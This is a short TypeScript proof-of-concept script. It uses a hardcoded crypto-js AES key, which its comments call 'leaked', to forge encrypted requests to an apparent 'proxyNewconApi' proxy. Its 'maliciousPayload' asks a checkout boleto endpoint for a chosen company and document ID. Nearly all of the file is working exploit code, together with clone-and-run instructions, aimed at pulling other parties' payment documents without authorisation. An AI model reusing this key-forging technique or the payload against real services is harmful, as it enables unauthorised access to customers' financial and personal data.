// how to
// git clone github.com/z3xddd/EncodeDecodeCipherCrypto@latest
// cd EncodeDecodeCipherCrypto && npm i && npm run hash
// TypeScript for Encode and Decode CryptoCipher using leaked SecretKey

import AES from 'crypto-js/aes'
import UTF8 from 'crypto-js/enc-utf8'
const env = {
  cipherSecretKey: 'cipher-crypto-key',
}
export const cryptoRequest = {
  encrypt(fn: any, method: any, ...[input, init]: any) {
    const data = {
      fnName: 'proxyNewconApi',
      input,
      init,
      method,
    }
    return AES.encrypt(JSON.stringify(data), env.cipherSecretKey).toString()
  },
  decrypt(encryptedData: string) {
    const bytes = AES.decrypt(encryptedData, env.cipherSecretKey)
    return JSON.parse(UTF8.stringify(bytes))
  },
}
const maliciousPayload = {
  input: '/checkout/boleto?companyId=1&documentId=1041274462&documentType=1',
  init: {
    body: undefined
  },
  method: 'GET'
}
const maliciousResult = cryptoRequest.encrypt(null, maliciousPayload.method, maliciousPayload.input, maliciousPayload.init);
console.log(maliciousResult);
console.log(cryptoRequest.decrypt(maliciousResult));
